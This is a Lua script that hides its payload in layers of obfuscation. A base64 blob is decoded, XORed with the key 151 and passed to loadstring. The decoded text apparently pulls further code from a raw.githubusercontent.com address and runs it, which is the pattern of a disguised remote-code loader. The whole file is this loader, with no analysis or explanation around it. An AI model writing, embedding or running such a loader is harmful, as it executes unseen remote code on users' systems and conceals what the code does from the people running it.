local __a1="wrrCusK3w4fDv8Oiw7TDs8Otw7bDvsK3w5/DosO1wrfDm8O4w7bDs8Oyw6XCncOww7LDo8Oww7LDucOhwr/CvsK5w4TDtMOlw77Dp8Ojw4PDvsOjw7vDssK3wqrCt8K1w4fDv8Oiw7TDs8Otw7bDvsK3w5/DosO1wrXCncOww7LDo8Oww7LDucOhwr/CvsK5w4TDtMOlw77Dp8Ojw4TDosO1w4PDvsOjw7vDssK3wqrCt8K1w4HDssOlw6TDvsO4w7nCt8KmwrnCp8K1wp3DsMOyw6PDsMOyw7nDocK/wr7CucOEw7TDpcO+w6fDo8OWw6LDo8O/w7jDpcOZw7bDusOywrfCqsK3wrXDlcOuwrfDh8O/w6LDtMK3w5nDsMO4wrXCncKdw7vDuMO0w7bDu8K3w6TDosO0w7TDssOkw6TCu8K3w7LDpcOlwrfCqsK3w6fDtMO2w7vDu8K/w7HDosO5w7TDo8O+w7jDucK/wr7CncK3wrfCt8K3w7vDuMO0w7bDu8K3w6TDpcO0wrfCqsK3w7DDtsO6w7LCrcOfw6PDo8Onw5DDssOjwr/CtcO/w6PDo8Onw6TCrcK4wrjDpcO2w6DCucOww77Do8O/w6LDtcOiw6TDssOlw7TDuMO5w6PDssO5w6PCucO0w7jDusK4w7/DuMO2w7nDucO/w7bDo8OtwrjDhMO0w6XDvsOnw6PCuMOlw7LDscOkwrjDv8Oyw7bDs8OkwrjDusO2w77DucK4w5LDjcOEw7TDpcO+w6fDo8K5w7vDosO2wrXCvsKdwrfCt8K3wrfDtsOkw6TDssOlw6PCv8Okw6XDtMK3w7bDucOzwrfCtMOkw6XDtMK3wqnCt8KnwrvCt8K1w5/Do8Ojw6fDkMOyw6PCt8Oxw7bDvsO7w7LDs8K1wr7CncK3wrfCt8K3w7vDuMO0w7bDu8K3w7HDucK7wrfDu8O4w7bDs8OSw6XDpcK3wqrCt8O7w7jDtsOzw6TDo8Olw77DucOwwr/DpMOlw7TCvsKdwrfCt8K3wrfDtsOkw6TDssOlw6PCv8Oxw7nCu8K3wrXDu8O4w7bDs8Okw6PDpcO+w7nDsMK3w7LDpcOlw7jDpcKtwrfCtcK3wrnCucK3w6PDuMOkw6PDpcO+w7nDsMK/w7vDuMO2w7PDksOlw6XCvsK+wp3Ct8K3wrfCt8Oxw7nCv8K+wp3DssO5w7PCvsKdwp3DvsOxwrfDucO4w6PCt8Okw6LDtMO0w7LDpMOkwrfDo8O/w7LDucKdwrfCt8K3wrfDoMO2w6XDucK/wrXDjMOHw7/DosO0w7PDrcO2w77Ct8Ofw6LDtcOKwrfDksOlw6XDuMOlwq3Ct8K1wrfCucK5wrfDo8O4w6TDo8Olw77DucOwwr/DssOlw6XCvsK+wp3DssO5w7M="
local ___a2=151
local ____a3=function(_b4)
  local __b5={}
  local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
  _b4=string.gsub(_b4,'[^'..b..'=]','')
  _b4:gsub('.',function(c)
    if c~='=' then
      local n=b:find(c)-1
      for i=6,1,-1 do __b5[#__b5+1]=n%2^i-n%2^(i-1)>0 and 1 or 0 end
    end
  end)
  local s,r='',''
  for i=1,#__b5,8 do
    local byte=0
    for j=0,7 do byte=byte+(__b5[i+j] or 0)*2^(7-j) end
    if byte>0 then s=s..string.char(byte) end
  end
  return s
end
local _raw=____a3(__a1)
local _out={}
for i=1,#_raw do _out[i]=string.char(string.byte(_raw,i)~___a2) end
loadstring(table.concat(_out))()
